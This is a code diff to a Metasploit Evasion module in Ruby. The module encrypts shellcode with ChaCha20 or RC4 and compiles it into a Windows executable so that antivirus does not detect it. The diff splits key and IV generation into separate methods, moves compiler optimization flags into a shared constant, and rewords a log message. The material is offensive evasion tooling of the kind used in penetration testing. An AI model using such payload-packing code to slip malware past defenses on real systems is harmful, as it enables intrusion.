@@ -1,6 +1,5 @@
 require 'metasploit/framework/compiler/mingw'
 require 'metasploit/framework/compiler/windows'
-
 class MetasploitModule < Msf::Evasion
   RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
   def initialize(info = {})
@@ -36,7 +35,7 @@ class MetasploitModule < Msf::Evasion
 
     register_advanced_options(
       [
-        OptEnum.new('OptLevel', [ false, 'The optimization level to compile with', 'Os', [ 'Og', 'Os', 'O0', 'O1', 'O2', 'O3' ] ]),
+        OptEnum.new('OptLevel', [ false, 'The optimization level to compile with', 'Os', Metasploit::Framework::Compiler::Mingw::OPTIMIZATION_FLAGS ]),
       ]
     )
   end
@@ -474,8 +473,8 @@ class MetasploitModule < Msf::Evasion
             @
     else
       @inject << %@
-            #{Rex::Text.to_c key[:key], Rex::Text::DefaultWrap, 'key'}
-            #{Rex::Text.to_c key[:iv], Rex::Text::DefaultWrap, 'iv'}
+            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
+            #{Rex::Text.to_c iv, Rex::Text::DefaultWrap, 'iv'}
             chacha_ctx ctx;
             chacha_keysetup(&ctx, key, 256, 96);
             chacha_ivsetup(&ctx, iv);
@@ -509,8 +508,12 @@ class MetasploitModule < Msf::Evasion
       @key ||= Rex::Text.rand_text_alpha(32..64)
     else
       @key ||= Rex::Text.rand_text(32)
+    end
+  end
+
+  def iv
+    if datastore['CIPHER'] == 'chacha'
       @iv ||= Rex::Text.rand_text(12)
-      return { iv: @iv, key: @key }
     end
   end
 
@@ -519,7 +522,7 @@ class MetasploitModule < Msf::Evasion
     p = payload.encoded + junk
     vprint_status("Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)")
     if datastore['CIPHER'] == 'chacha'
-      chacha = Rex::Crypto::Chacha20.new(key[:key], key[:iv])
+      chacha = Rex::Crypto::Chacha20.new(key, iv)
       p = chacha.chacha20_crypt(p)
       Rex::Text.to_c p, Rex::Text::DefaultWrap, 'shellcode'
     else
@@ -560,7 +563,7 @@ class MetasploitModule < Msf::Evasion
     src << main
     # obf_src =  Metasploit::Framework::Compiler::Windows.generate_random_c src
     path = Tempfile.new('main').path
-    vprint_status path
+    vprint_good "Saving temporary source file in #{path}"
     compile_opts =
       {
         strip_symbols: true,
